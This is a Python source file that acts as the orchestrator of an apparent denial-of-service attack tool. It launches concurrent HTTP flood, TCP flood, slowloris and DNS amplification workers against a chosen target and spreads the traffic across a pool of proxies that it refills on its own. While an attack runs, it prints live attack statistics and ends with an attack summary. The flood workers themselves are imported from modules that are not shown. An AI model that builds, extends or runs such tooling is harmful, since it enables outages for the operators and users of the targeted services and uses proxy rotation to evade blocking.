# language: Python 3.10+, file: Module/orchestrator.py
# *attack orchestrator + proxy refresher + live stats printer + summary*
# ties http_flood / tcp_flood / slowloris / dns_amp together

import asyncio, time, threading, sys
from urllib.parse import urlparse

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from Module.colors      import R, Y, G, C, W, DG, M, RS
from Module.state       import stats, slock, stop, rps_buf, _last_sent, reset_stats
from Module.logger      import log_event
from Module.proxy       import fetch_proxies

# ── proxy refresher ────────────────────────────────────────────────────
async def _proxy_refresher(proxies_ref: list, pfilter, threshold=50, interval=60):
    """Refill the proxy pool in-background when it drops below *threshold*."""
    while not stop[0]:
        await asyncio.sleep(interval)
        if len(proxies_ref[0]) < threshold:
            print(f"\n{Y}[~] Pool low ({len(proxies_ref[0])}), refreshing...{RS}")
            fresh = fetch_proxies(pfilter, verbose=False)
            if fresh:
                proxies_ref[0] = fresh
                with slock:
                    stats["proxies_total"] = len(fresh)
                print(f"{G}[~] Pool refreshed: {len(fresh)} proxies{RS}")

# ── live stats printer (thread) ────────────────────────────────────────
def printer() -> None:
    """
    Runs in a daemon thread.  Prints one auto-overwriting line per second
    showing RPS (rolling avg), sent/ok/fail/dead counts, and MB sent.
    """
    while not stop[0]:
        time.sleep(1)
        if not stats["start"]:
            continue
        elapsed   = max(1, int(time.time() - stats["start"]))
        cur_sent  = stats["sent"]
        rps_now   = cur_sent - _last_sent[0]
        _last_sent[0] = cur_sent
        rps_buf.append(rps_now)
        avg_rps   = sum(rps_buf) / max(1, len(rps_buf))
        mb_sent   = stats["bytes_sent"] / 1_048_576
        peak      = max(rps_buf) if rps_buf else 1
        bar_w     = min(20, int(20 * rps_now / max(peak, 1)))
        bar       = f"{G}" + "▓" * bar_w + f"{DG}" + "░" * (20 - bar_w) + f"{RS}"
        sr        = stats["success"] / max(1, stats["sent"]) * 100
        sys.stdout.write(
            f"\r                   {C}[{elapsed:>4}s]{RS} "
            f"RPS {M}{avg_rps:>6.0f}{RS} {bar} "
            f"Sent {G}{stats['sent']:>7}{RS} "
            f"OK {G}{stats['success']:>7}{RS}({G}{sr:>5.1f}%{RS}) "
            f"Fail {R}{stats['fail']:>6}{RS} "
            f"Dead {Y}{stats['dead']:>4}{RS} "
            f"MB {C}{mb_sent:>7.2f}{RS}   "
        )
        sys.stdout.flush()

# ── post-attack summary ────────────────────────────────────────────────
def print_summary(target: str, port: int, dur: int) -> None:
    elapsed = max(1, int(time.time() - stats["start"]))
    mb_sent = stats["bytes_sent"] / 1_048_576
    print(f"\n\n                   {C}{'═' * 63}{RS}")
    print(f"                   {W}{'ATTACK SUMMARY':^63}{RS}")
    print(f"                   {C}{'═' * 63}{RS}")
    print(f"                     Target      : {Y}{target}:{port}{RS}")
    print(f"                     Duration    : {elapsed}s / {dur}s requested")
    print(f"                     Sent        : {G}{stats['sent']:,}{RS}")
    print(f"                     Success     : {G}{stats['success']:,}{RS}  ({stats['success'] * 100 // max(1, stats['sent'])}%)")
    print(f"                     Failed      : {R}{stats['fail']:,}{RS}")
    print(f"                     Dead Proxies: {Y}{stats['dead']:,}{RS}")
    print(f"                     Avg RPS     : {M}{stats['sent'] // elapsed:,}{RS}")
    print(f"                     Data Sent   : {C}{mb_sent:.2f} MB{RS}")
    print(f"                     Proxies     : {stats['proxies_alive']}/{stats['proxies_total']} validated")
    print(f"                   {C}{'═' * 63}{RS}\n")
    log_event("info", (
        f"ATTACK END | target={target}:{port} duration={elapsed}s/{dur}s "
        f"sent={stats['sent']} ok={stats['success']} fail={stats['fail']} "
        f"dead={stats['dead']} rps_avg={stats['sent']//elapsed} "
        f"mb={mb_sent:.2f} proxies={stats['proxies_alive']}/{stats['proxies_total']}"
    ))

# ── main attack coroutine ──────────────────────────────────────────────
async def run_attack(target: str, port: int, dur: int, conc: int,
                     mode: str, proxies: list, rpp: int, tout: float,
                     mpool: list, pfilter) -> None:
    """
    Spawns *conc* worker tasks cycling through the proxy pool, maintains
    the pool with a background refresher, shuts down cleanly on timeout or
    KeyboardInterrupt (stop[0] = True sets the halt flag).
    """
    from Module.banner     import cls, print_banner
    from Module.http_flood import http_worker
    from Module.tcp_flood  import tcp_worker
    from Module.slowloris  import slowloris_worker
    from Module.dns_amp    import dns_worker

    if mode in ("http", "slowloris"):
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        host = urlparse(target).netloc.split(":")[0] or target
    else:
        if target.startswith(("http://", "https://")):
            host = urlparse(target).netloc.split(":")[0]
        else:
            host = target.split("/")[0].split(":")[0]

    reset_stats()
    stats["start"] = time.time()
    log_event("info", f"ATTACK START | target={target}:{port} mode={mode} "
              f"workers={conc} duration={dur}s")

    idx, active, deadline = 0, set(), time.time() + dur
    proxies_ref = [proxies]

    # Clean screen and show banner at top
    cls()
    print_banner()

    live_title = f"ATTACK ACTIVE  •  {mode.upper()}"
    tg_str     = f"{target}:{port}"
    print(f"                   {R}╔═══════════════════════════════════════════════════════════════╗{RS}")
    print(f"                   {R}║{RS}{W}{live_title:^63}{RS}{R}║{RS}")
    print(f"                   {R}║{RS}  Target  : {Y}{tg_str:<26}{RS}Workers: {C}{conc:<6}{RS} Dur: {C}{dur}s{RS}  {R}║{RS}")
    print(f"                   {R}╚═══════════════════════════════════════════════════════════════╝{RS}\n")

    refresher = asyncio.create_task(_proxy_refresher(proxies_ref, pfilter))

    while not stop[0] and time.time() < deadline:
        pool = proxies_ref[0]
        if not pool and mode not in ("dns", "slowloris"):
            await asyncio.sleep(1)
            continue

        while len(active) < conc and time.time() < deadline:
            if mode == "http":
                p = pool[idx % len(pool)]; idx += 1
                t = asyncio.create_task(http_worker(target, host, p, rpp, tout, mpool))
            elif mode == "tcp":
                p = pool[idx % len(pool)]; idx += 1
                t = asyncio.create_task(tcp_worker(host, port, p, rpp))
            elif mode == "slowloris":
                t = asyncio.create_task(slowloris_worker(host, port, dur))
            elif mode == "dns":
                t = asyncio.create_task(dns_worker(host, rpp))
            else:
                break
            active.add(t)
            t.add_done_callback(active.discard)

        await asyncio.sleep(0.002)

    # cancel everything and wait for clean teardown
    for t in list(active):
        t.cancel()
    refresher.cancel()
    await asyncio.gather(*list(active), refresher, return_exceptions=True)
